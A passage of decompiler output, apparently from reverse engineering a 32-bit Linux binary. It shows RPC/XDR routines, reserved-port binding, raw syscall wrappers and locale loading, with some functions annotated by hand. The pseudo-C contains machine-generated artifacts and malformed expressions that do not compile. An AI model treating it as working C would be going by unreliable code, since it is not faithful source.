                *L08079220 = 12;
                *L08079228 = *L08078B14;
                goto L080643d8;
            }
            (save)0;
            (save) *A1c;
            L08066A50();
	    // Selects a socket as being non-blocking
            ioctl( *A1c, FIONBIO, & Vffffffc4);
            *(ebx + 4) = 1;
        } else {
            *(ebx + 4) = 0;
        }
        *ebx = *A1c;
        *Vffffffc0 = L08067094();
        eax = Vffffffc0;
    } else {
L080643d8:
        if(ebx != 0) {
            L0805C290(ebx);
        }
        if(Vffffffc0 != 0) {
            L0805C290(Vffffffc0);
        }
        eax = 0;
    }
    esp = ebp - 76;
}


L08064400(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    return(L080641C8(A8, Ac, A10, A14, A18, A1c, 8800, 8800));
}











L080649E0(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffea = 0;
    Vffffffec = -1;
    *(A8 + 2) = 28416;
    ebx = L080641C8(A8, 100000, 2, *L080791D8, *L080791DC, & Vffffffec, 400, 400);
    if(ebx != 0) {
        Vfffffff0 = Ac;
        Vfffffff4 = A10;
        Vfffffff8 = A14;
        Vfffffffc = 0;
        ecx = *(ebx + 4);
        if(*( *ecx)(ebx, 3, 0x8064ac8, & Vfffffff0, 0x8064fbc, & Vffffffea, *L080791E0, *L080791E4) != 0) {
            *L08079220 = 14;
            *( *( *(ebx + 4) + 8))(ebx, 0x8079224);
        } else {
            if(Vffffffea == 0) {
                *L08079220 = 15;
            }
        }
        *( *( *(ebx + 4) + 16))(ebx);
    }
    *(A8 + 2) = 0;
    esp = ebp - 40;
    return(Vffffffea & 65535);
}




L08064B1C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = L0806510C(A8, Ac) == 0 ? 0 : L080651B8(A8, Ac + 4, Ac + 8, 400);
}








L08064C9C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *(Ac + 4) = 0;
    *(Ac + 8) = 2;
    eax = *A8 == 0 && L08064F10(A8, Ac) != 0 && L0806510C(A8, Ac + 4) != 0 && L08064F10(A8, Ac + 8) != 0 && L08064F10(A8, Ac + 12) != 0 ? L08064F10(A8, Ac + 16) : 0;
}







L08064E74(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe8;



    Vffffffe8 = 2;
    return(*A8( & Vffffffe8, Ac));
}




L08064EB4(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(L08064F10(A8, Ac));
}


L08064EC8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    if(*A8 == 0) {
        return(*( *( *(A8 + 4) + 4))(A8, Ac));
    }
    if(*A8 == 1) {
        return(*( *( *(A8 + 4)))(A8, Ac));
    }
    if(*A8 != 2) {
        esp = ebp;
        return(0);
    }
    esp = ebp;
    return(1);
}



L08064F10(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    if(*A8 == 1) {
        return(*( *( *(A8 + 4)))(A8, Ac));
    }
    if(*A8 == 0) {
        return(*( *( *(A8 + 4) + 4))(A8, Ac));
    }
    if(*A8 != 2) {
        esp = ebp;
        return(0);
    }
    esp = ebp;
    return(1);
}










L0806510C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(L08064EC8(A8, Ac));
}


L08065120(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    if(A10 != 0) {
        if(!(ebx = A10 & 3)) {
            ebx = 4 - ebx;
        }
        if(*A8 != 1) {
            goto L08065170;
        }
        if(*( *( *(A8 + 4) + 8))(A8, Ac, A10) == 0) {
            goto L080651a1;
        }
        if(ebx != 0) {
            (save)ebx;
            (save)0x807e758;
            (save)A8;
            eax = *( *( *(A8 + 4) + 8))();
            goto L080651ad;
L08065170:
            if(*A8 != 0) {
                goto L0806519c;
            }
            if(*( *( *(A8 + 4) + 12))(A8, Ac, A10) == 0) {
                goto L080651a1;
            }
            if(ebx != 0) {
                eax = *( *( *(A8 + 4) + 12))(A8, 0x807923c, ebx);
                goto L080651ad;
L0806519c:
                if(*A8 != 2) {
L080651a1:
                    eax = 0;
                    goto L080651ad;
                }
            }
        }
    }
    eax = 1;
L080651ad:
}



L080651B8(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    esi = A10;
    ebx = *Ac;
    L0805E954();
    if(L08064EB4(A8, esi) != 0) {
        esi = *esi;
        if(A14 >= esi) {
            goto L080651f0;
        }
        if(*A8 == 2) {
L080651f0:
            eax = *A8;
            if(eax != 1) {
                < ? L0806524c : ;
                if(eax == 2) {
                    goto L08065258;
                }
            } else {
                if(esi == 0) {
L08065204:
                    eax = 1;
                    goto L08065272;
                }
                if(ebx == 0) {
                    ebx = L0805BD74(esi);
                    *Ac = ebx;
                    if(ebx == 0) {
                        (save)"out of memory";
                        L0804F680(0x80787a4, "xdr_bytes: %s\n", L0805E584( *L08078F9C, 10, 1));
                        goto L08065270;
                    }
                }
                eax = L08065120(A8, ebx, esi);
                goto L08065272;
L08065258:
                if(ebx == 0) {
                    goto L08065204;
                }
                L0805C290(ebx);
                *Ac = 0;
                goto L08065204;
            }
        }
    }
L08065270:
    eax = 0;
L08065272:
}









L08065408(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;



    *A8 = A14;
    *(A8 + 4) = 0x8079240;
    *(A8 + 16) = Ac;
    *(A8 + 12) = *(A8 + 16);
    *(A8 + 20) = A10;
    return(*A8);
}





















L08065734(A8)
/* unknown */ void  A8;
{



    eax = A8;
    if(eax <= 99) {
        eax = 4000;
    }
    return(eax + 3 & 252);
}



L08065750(A8, Ac, A10, A14, A18, A1c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = Ac;
    edi = A10;
    ebx = L0805BD74(68);
    L0805E954();
    esp = esp + 4;
    if(ebx != 0) {
        esi = L08065734(esi);
        *(ebx + 60) = esi;
        edi = L08065734(edi);
        *(ebx + 64) = edi;
        eax = L0805BD74(edi + esi + 4);
        *(ebx + 4) = eax;
        if(*(ebx + 4) != 0) {
            goto L080657c4;
        }
    }
    (save)"out of memory";
    eax = L0804F680(0x80787a4, "xdrrec_create: %s\n", L0805E584( *L08078F9C, 10, 1));
    goto L0806583e;
L080657c4:
    *(ebx + 12) = *(ebx + 4);
    if(!( *(ebx + 12) & 3)) {
        do {
            *(ebx + 12) = *(ebx + 12) + 1;
        } while(*(ebx + 12) & 3);
    }
    *(ebx + 40) = *(ebx + 12) + esi;
    *(A8 + 4) = 0x8079260;
    *(A8 + 12) = ebx;
    *ebx = A14;
    *(ebx + 32) = A18;
    *(ebx + 8) = A1c;
    eax = *(ebx + 12);
    *(ebx + 20) = eax;
    *(ebx + 16) = *(ebx + 20);
    *(ebx + 24) = *(ebx + 12);
    *(ebx + 16) = *(ebx + 16) + 4;
    *(ebx + 20) = *(ebx + 20) + esi;
    *(ebx + 28) = 0;
    *(ebx + 36) = edi;
    *(ebx + 48) = *(ebx + 40);
    eax = edi + *(ebx + 48);
    *(ebx + 48) = eax;
    *(ebx + 44) = eax;
    *(ebx + 52) = 0;
    *(ebx + 56) = 1;
L0806583e:
}


















L08065C84(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffe78;
	/* unknown */ void  Vffffffbd;



    if(A8 != 0) {
        if(uname( & Vfffffe78) == -1) {
            goto L08065cda;
        }
        edx = & Vffffffbd;
        al = 0;
        edi = edx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        if(Ac >= !ecx) {
            (save)edx;
            L08056640(A8);
            eax = 0;
            goto L08065cdf;
        }
    }
    *L08078B14 = 22;
L08065cda:
    eax = -1;
L08065cdf:
    esp = ebp + -400;
}



//L08065CEC(A8, Ac, A10, A14, A18, A1c)
mmap(start, length, prot, flags, fd, offset)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffe8 = A8;
    Vffffffec = Ac;
    Vfffffff0 = A10;
    Vfffffff4 = A14;
    Vfffffff8 = A18;
    Vfffffffc = A1c;
    eax = 90;
    ebx = & Vffffffe8;
    asm("int 0x80");
    edx = eax;
    if(edx + 4096 <= 4095) {
        *L08078B14 = ~edx;
        edx = -1;
    }
    eax = edx;
    esp = ebp - 40;
}



//L08065D50(A8, Ac, A10)
//unsure about the format here; stat(2) gives (filename, buffer)
stat(??)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A8 == 1) {
        eax = 106;
        asm("int 0x80");
        if(eax >= 0) {
            goto L08065d83;
        }
        *L08078B14 = ~eax;
    } else {
        *L08078B14 = 22;
    }
    eax = -1;
L08065d83:
}



//L08065D8C(A8, Ac, A10)
fstat(fd, buffer)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A8 == 1) {
        eax = 108;
        asm("int 0x80");
        if(eax >= 0) {
            goto L08065dbf;
        }
        *L08078B14 = ~eax;
    } else {
        *L08078B14 = 22;
    }
    eax = -1;
L08065dbf:
}





L08065E1C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edi = 0;
    Vfffffff8 = 0;
    if(A10 > 0) {
        ebx = Ac;
        eax = A10 & 31;
        if(A10 > 0) {
            if(eax == 0) {
                goto L08065ef8;
            }
            if(eax > 8) {
                if(eax > 16) {
                    if(eax >= 25) {
                        goto L08065ef8;
                    }
                    eax = 8;
                    if(A10 <= 8) {
                        eax = A10;
                    }
                    eax = readv(A8, ebx, eax);
                    esi = eax;
                    if(esi < 0) {
                        goto L08065fab;
                    }
                    ebx = ebx + 64;
                    edi = edi + 8;
                    Vfffffff8 = Vfffffff8 + esi;
                }
                esi = A10 - edi;
                eax = 8;
                if(esi <= 8) {
                    eax = esi;
                }
                eax = readv(A8, ebx, eax);
                esi = eax;
                if(esi < 0) {
                    goto L08065fab;
                }
                ebx = ebx + 64;
                edi = edi + 8;
                Vfffffff8 = Vfffffff8 + esi;
            }
        }
        esi = A10 - edi;
        eax = 8;
        if(esi <= 8) {
            eax = esi;
        }
        eax = readv(A8, ebx, eax);
        esi = eax;
        if(esi >= 0) {
            ebx = ebx + 64;
            edi = edi + 8;
            goto L08065fc2;
L08065ef8:
            esi = A10 - edi;
            eax = 8;
            if(esi <= 8) {
                eax = esi;
            }
            eax = readv(A8, ebx, eax);
            esi = eax;
            if(esi >= 0) {
                ebx = ebx + 64;
                eax = edi + 8;
                Vfffffff8 = Vfffffff8 + esi;
                esi = A10 - eax;
                eax = 8;
                if(esi <= 8) {
                    eax = esi;
                }
                eax = readv(A8, ebx, eax);
                esi = eax;
                if(esi >= 0) {
                    ebx = ebx + 64;
                    eax = edi + 16;
                    Vfffffff8 = Vfffffff8 + esi;
                    esi = A10 - eax;
                    eax = 8;
                    if(esi <= 8) {
                        eax = esi;
                    }
                    eax = readv(A8, ebx, eax);
                    esi = eax;
                    if(esi >= 0) {
                        ebx = ebx + 64;
                        eax = edi + 24;
                        Vfffffff8 = Vfffffff8 + esi;
                        esi = A10 - eax;
                        eax = 8;
                        if(esi <= 8) {
                            eax = esi;
                        }
                        eax = readv(A8, ebx, eax);
                        esi = eax;
                        if(esi >= 0) {
                            goto L08065fbc;
                        }
                    }
                }
            }
        }
L08065fab:
        if(*L08078B14 == 38) {
            goto L08065fd8;
        }
        goto L080660e7;
L08065fbc:
        ebx = ebx + 64;
        edi = edi + 32;
L08065fc2:
        Vfffffff8 = Vfffffff8 + esi;
        if(A10 > edi) {
            goto L08065ef8;
        }
    }
    eax = Vfffffff8;
    goto L080660e7;
L08065fd8:
    *L08078B14 = 0;
    Vfffffff8 = 0;
    edi = 0;
    if(A10 > 0) {
        eax = A10 & 3;
        if(A10 > 0) {
            if(eax == 0) {
                goto L08066034;
            }
            if(eax > 1) {
                if(eax > 2) {
                    Vfffffff8 = *(Ac + 4);
                    edi = 1;
                }
                Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 4);
                edi = edi + 1;
            }
        }
        Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 4);
        edi = edi + 1;
        if(A10 > edi) {
L08066034:
            do {
                Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 4);
                Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 12);
                Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 20);
                Vfffffff8 = Vfffffff8 + *(Ac + edi * 8 + 28);
                edi = edi + 4;
            } while(A10 > edi);
        }
    }
    esp = esp - (Vfffffff8 + 3 & 252);
    Vfffffffc = esp;
    esi = read(A8, Vfffffffc, Vfffffff8);
    if(esi < 0) {
        eax = -1;
    } else {
        if(esi == 0) {
            eax = 0;
        } else {
            Vfffffff8 = esi;
            edi = 0;
            if(A10 > 0) {
                do {
                    ebx = *(Ac + edi * 8 + 4) <= Vfffffff8 ? *(Ac + edi * 8 + 4) : Vfffffff8;
                    eax = *(Ac + edi * 8);
                    L0805652C(eax, Vfffffffc, ebx);
                    Vfffffffc = Vfffffffc + ebx;
                    if(Vfffffff8 = Vfffffff8 - ebx) {
                        break;
                    }
                    edi = edi + 1;
                } while(A10 > edi);
            }
            eax = esi;
        }
    }
L080660e7:
    esp = ebp - 20;
}



//L080660F4(A8, Ac, A10)
fcntl(fd, cmd, arg)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 55;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08066124(A8, Ac, A10)
lseek(fd, offset, whence)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 19;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L08066154(A8, Ac)
munmap(start, length)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = 91;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L08066180(A8, Ac, A10)
readv(fd, iovec, count)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    eax = 145;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx < 0) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}



//L080661B0(A8, Ac, A10, A14)
mremap(old_address, old_size, new_size, flags)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{



    eax = 163;
    edx = A10;
    asm("int 0x80");
    edx = eax;
    if(edx > -4096) {
        eax = L08056E64( ~edx);
        (restore)edx;
        *eax = edx;
        eax = -1;
    }
}


//L080661E8(A8)
brk(end_data_segment)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    if(brk2() == 0) {
        ebx = A8 + *L08079280;
        eax = 45;
        asm("int 0x80");
        *L08079280 = eax;
        if(eax == ebx) {
            eax = ebx - A8;
            goto L08066227;
        }
        *L08078B14 = 12;
    }
    eax = -1;
L08066227:
}


// called by brk
//L08066230()
brk2(end_data_segment)
{
	/* unknown */ void  ebx;



    if(*L08079280 == 0) {
        eax = 45;
        ebx = 0;
        asm("int 0x80");
        *L08079280 = eax;
        if(eax != 0) {
            goto L08066260;
        }
        *L08078B14 = 12;
        eax = -1;
    } else {
L08066260:
        eax = 0;
    }
}



L0806626C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ebx = Ac;
    if(ebx > 0) {
        eax = 0;
        asm("cld");
        if(ebx > 11) {
            edx = ~A8 & 3;
            ebx = ebx - edx;
            ecx = edx;
            asm("rep stosb");
            ecx = ebx >> 2;
            asm("rep stosd");
            ebx = ebx & 3;
        }
        ecx = ebx;
        asm("rep stosb");
    }
}



L080662B0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  edi;



    eax = 0;
    if(!(ecx = A8 & 3)) {
        if(*A8 == ch) {
            goto L0806636e;
        }
        eax = 1;
        ecx = ecx ^ 3;
        == ? L080662f3 : ;
        if(*(A8 + 1) == ch) {
            goto L0806636e;
        }
        eax = 2;
        if(!(ecx = ecx - 1)) {
            if(*(A8 + 2) == ch) {
                goto L0806636e;
            }
            eax = 3;
        }
    }
    while(1) {
        ecx = *(A8 + eax);
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L0806635b;
        }
        ecx = *(A8 + eax + 4);
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08066358;
        }
        ecx = *(A8 + eax + 8);
        if((edi = -16843009 + ecx) || (edi = (edi ^ ecx | -16843009) + 1)) {
            goto L08066355;
        }
        ecx = *(A8 + eax + 12);
        if((edi = -16843009 + ecx) || !(edi = (edi ^ ecx | -16843009) + 1)) {
            break;
        }
        eax = eax + 16;
    }
    eax = eax + 4;
L08066355:
    eax = eax + 4;
L08066358:
    eax = eax + 4;
L0806635b:
    if(cl != 0) {
        eax = eax + 1;
        if(ch != 0) {
            eax = eax + 1;
            if(!(ecx & 16711680)) {
                eax = eax + 1;
            }
        }
    }
L0806636e:
}



L08066380(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A8;
    esi = Ac;
    edx = A10;
    ecx = A14;
    eax = ecx;
    ecx = ecx >> 3;
    if(!(eax = ~eax & 7)) {
        ecx = ecx + 1;
        edi = edi - (eax << 2);
        esi = esi - eax;
        edx = edx - eax;
        goto ((eax >> 2) + (eax >> 2) * 8 + 0x80663bd);
    }
    do {
        eax = *esi;
        asm("adc eax,[edx]");
        *edi = eax;
        eax = *(esi + 4);
        asm("adc eax,[edx+0x4]");
        *(edi + 4) = eax;
        eax = *(esi + 8);
        asm("adc eax,[edx+0x8]");
        *(edi + 8) = eax;
        eax = *(esi + 12);
        asm("adc eax,[edx+0xc]");
        *(edi + 12) = eax;
        eax = *(esi + 16);
        asm("adc eax,[edx+0x10]");
        *(edi + 16) = eax;
        eax = *(esi + 20);
        asm("adc eax,[edx+0x14]");
        *(edi + 20) = eax;
        eax = *(esi + 24);
        asm("adc eax,[edx+0x18]");
        *(edi + 24) = eax;
        eax = *(esi + 28);
        asm("adc eax,[edx+0x1c]");
        *(edi + 28) = eax;
        edi = edi + 32;
        esi = esi + 32;
        edx = edx + 32;
    } while(ecx = ecx - 1);
    asm("sbb eax,eax");
    return(~eax);
}



L08066420(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    (save)ebp;
    edi = A8 + A10 * 4;
    esi = Ac + A10 * 4;
    ecx = ~A10;
    ebp = 0;
    do {
        eax = *(esi + ecx * 4);
        asm("mul ebx");
        eax = eax + ebp;
        asm("adc edx,+0x0");
        *(edi + ecx * 4) = *(edi + ecx * 4) + eax;
        asm("adc edx,+0x0");
        ebp = edx;
    } while(ecx = ecx + 1);
    eax = ebp;
    (restore)ebp;
}

































L08066A50(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff0;



    ebx = Ac;
    if(ebx != 0) {
        if(*ebx == 2) {
            goto L08066a94;
        }
        *L08078B14 = 96;
        eax = -1;
    } else {
        ebx = & Vfffffff0;
        L0806626C(ebx, 16);
        Vfffffff0 = 2;
L08066a94:
        if(*L0807E768 == 0) {
            getpid();
            ecx = 424;
            asm("cdq");
            *L0807E768 = ecx / ecx % ecx / ecx + 600;
        }
        eax = -1;
        *L08078B14 = 98;
        esi = 0;
        do {
            if(*L08078B14 != 98) {
                break;
            }
            ax = *L0807E768;
            *L0807E768 = *L0807E768 + 1;
            asm("xchg al,ah");
            *(ebx + 2) = ax;
            if(*L0807E768 > 1023) {
                *L0807E768 = 600;
            }
            eax = bind(A8, ebx, 16);
            esi = esi + 1;
            if(esi > 423) {
                break;
            }
        } while(eax < 0);
    }
    esp = ebp - 28;
}





L08066BFC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffd4;



    ebx = Ac;
    Vffffffbc = 0;
    if(*( *ebx) == 0) {
        eax = L08055668("LC_ALL");
        *ebx = eax;
        if(eax == 0 || *eax == 0) {
            *ebx = L08055668( *(A8 * 4 + 0x806aa34));
        }
        if(*ebx == 0 || *( *ebx) == 0) {
            *ebx = L08055668("LANG");
        }
        if(*ebx == 0) {
            goto L08066c6a;
        }
        if(*( *ebx) == 0) {
L08066c6a:
            *ebx = "local";
        }
    }
    Vffffffac = esp;
    Vffffffb0 = *(A8 * 4 + 0x806aa34);
    Vffffffa4 = *ebx;
    al = 0;
    edi = Vffffffa4;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    edx = !ecx;
    edi = Vffffffb0;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    edi = !ecx - 1;
    esp = esp - (edx + edi * 2 + 27 & 252);
    esi = esp;
    (save)47;
    if(L08057970(Vffffffa4) != 0) {
        (save)Vffffffb0;
        L0804F808(esi, "%s/%s", *ebx);
    } else {
        (save)Vffffffb0;
        (save) *ebx;
        L0804F808(esi, "%s/%s/%s", "/usr/share/locale");
    }
    eax = open(esi, O_RDONLY);
    Vffffffb8 = eax;
    if(Vffffffb8 >= 0) {
        (save) & Vffffffc0;
        if(fstat(1, Vffffffb8) < 0) {
            goto L08066d8b;
        }
        if((Vffffffc8 & 61440) != 16384) {
            goto L08066d94;
        }
        close(Vffffffb8);
        (save)"/SYS_";
        (save)0;
        (save)L08057970(esi);
        L0805652C(L08067300(), Vffffffb0, edi + 1);
        (save)0;
        (save)esi;
        eax = open(esi, O_RDONLY);
        Vffffffb8 = eax;
        esp = esp + 20;
        if(Vffffffb8 >= 0) {
            (save) & Vffffffc0;
            if(fstat(1, Vffffffb8) < 0) {
L08066d8b:
                esp = *(ebp - 84);
            } else {
L08066d94:
                esp = *(ebp - 84);
                Vffffffa8 = *L08078B14;
                eax = mmap(0, Vffffffd4, PROT_READ, MAP_PRIVATE, Vffffffb8, 0);
                Vffffffb4 = eax;
                if(Vffffffb4 == -1) {
                    if(*L08078B14 != 38) {
                        goto L08066eaf;
                    }
                    eax = L0805BD74(Vffffffd4);
                    Vffffffb4 = eax;
                    if(Vffffffb4 == 0) {
                        goto L08066eaf;
                    }
                    esi = Vffffffd4;
                    edi = Vffffffb4;
                    if(esi > 0) {
                        do {
                            ebx = read(Vffffffb8, edi, esi);
                            if(ebx <= 0) {
                                goto L08066e08;
                            }
                            edi = edi + ebx;
                            esi = esi - ebx;
                        } while(esi > 0);
                        goto L08066e30;
L08066e08:
                        L0805C290(Vffffffb4);
                        if(ebx != 0) {
                            goto L08066eaf;
                        }
                        *L08078B14 = 22;
                        goto L08066eaf;
                    }
L08066e30:
                    *L08078B14 = Vffffffa8;
                }
                if(*Vffffffb4 == (A8 ^ 85226186)) {
                    Vffffffbc = 0;
                    goto L08066ec0;
L08066e54:
                    L0805C290(ebx);
                    *L08078B14 = 22;
                } else {
                    Vffffffbc = 1;
                    ecx = Vffffffb4;
                    edx = *(ecx + 3) << 24;
                    edx = edx | ( *(ecx + 2) & 255) << 16;
                    edx = edx | ( *(ecx + 1) & 255) << 8;
                    edx = edx | *ecx & 255;
                    if(edx == (A8 ^ 85226186)) {
                        goto L08066ec0;
                    }
                }
L08066e9f:
                munmap(Vffffffb4, Vffffffd4);
            }
L08066eaf:
            close(Vffffffb8);
        }
    }
    eax = 0;
    goto L08067033;
L08066ec0:
    ebx = Vffffffb4 + 4;
    if(Vffffffbc == 0) {
        eax = *(Vffffffb4 + 4);
    } else {
        edx = *(ebx + 3) << 24;
        edx = edx | ( *(ebx + 2) & 255) << 16;
        edx = edx | ( *(ebx + 1) & 255) << 8;
        eax = *ebx & 255 | edx;
    }
    if(*(A8 * 4 + 0x806bfb0) <= eax) {
        ebx = Vffffffb4 + 4;
        if(Vffffffbc == 0) {
            eax = *(Vffffffb4 + 4);
        } else {
            edx = *(ebx + 3) << 24;
            edx = edx | ( *(ebx + 2) & 255) << 16;
            edx = edx | ( *(ebx + 1) & 255) << 8;
            eax = *ebx & 255 | edx;
        }
        if(Vffffffd4 > eax * 4 + 8) {
            goto L08066f4c;
        }
    }
    *L08078B14 = 22;
    goto L08066e9f;
L08066f4c:
    ebx = Vffffffb4 + 4;
    if(Vffffffbc == 0) {
        eax = *(Vffffffb4 + 4);
    } else {
        edx = *(ebx + 3) << 24;
        edx = edx | ( *(ebx + 2) & 255) << 16;
        edx = edx | ( *(ebx + 1) & 255) << 8;
        eax = *ebx & 255 | edx;
    }
    ebx = L0805BD74(eax * 4 + 12);
    if(ebx == 0) {
        goto L08066e9f;
    }
    ecx = Vffffffb4;
    *ebx = ecx;
    *(ebx + 4) = Vffffffd4;
    esi = Vffffffb4 + 4;
    if(Vffffffbc == 0) {
        eax = *(ecx + 4);
    } else {
        edx = *(esi + 3) << 24;
        edx = edx | ( *(esi + 2) & 255) << 16;
        edx = edx | ( *(esi + 1) & 255) << 8;
        eax = *esi & 255 | edx;
    }
    *(ebx + 8) = eax;
    esi = 0;
    if(0 < eax) {
        edi = 0;
        do {
            ecx = Vffffffb4 + edi + 8;
            Vffffffa4 = ecx;
            if(Vffffffbc != 0) {
                ecx = Vffffffa4;
                edx = *(ecx + 3) << 24;
                edx = edx | ( *(ecx + 2) & 255) << 16;
                edx = edx | ( *(ecx + 1) & 255) << 8;
                eax = *ecx & 255 | edx;
            } else {
                eax = *ecx;
            }
            if(*(ebx + 4) <= eax) {
                goto L08066e54;
            }
            *(ebx + esi * 4 + 12) = eax + *ebx;
            edi = edi + 4;
            esi = esi + 1;
        } while(*(ebx + 8) > esi);
    }
    close(Vffffffb8);
    eax = ebx;
L08067033:
    esp = ebp - 104;
}



L08067040(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;



    esi = *L08078B14;
    if(A8 != 0 && *A8 != 0) {
        if(munmap( *A8, *(A8 + 4)) < 0) {
            if(*L08078B14 == 38) {
                L0805C290( *A8);
            }
            *L08078B14 = esi;
        }
        eax = L0805C290(A8);
    }
}



L08067094()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;



    ebx = *L0807E76C;
    if(ebx == 0) {
        (save)64;
        ebx = L0805C904(1);
        if(ebx == 0) {
            eax = 0;
            goto L08067141;
        }
        *L0807E76C = ebx;
    }
    if(*(ebx + 60) == 0) {
        *(ebx + 12) = *L08079230;
        *(ebx + 16) = *L08079234;
        *(ebx + 20) = *L08079238;
        *ebx = *(ebx + 12);
        *(ebx + 4) = *(ebx + 16);
        *(ebx + 8) = *(ebx + 20);
        *(ebx + 32) = 0x8079298;
        esi = & Vffffffe8;
        (save)0;
        L08065408(esi, ebx + 40, 20);
        L08064B1C(esi, ebx);
        L08064B1C(esi, ebx + 12);
        *(ebx + 60) = *( *(Vffffffec + 16))(esi);
        eax = Vffffffec;
        if(*(eax + 28) != 0) {
            *( *(eax + 28))(esi);
        }
    }
    eax = ebx;
L08067141:
    esp = ebp - 32;
}















L08067300(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = Ac - A8;
    eax = A8 - 4;
    do {
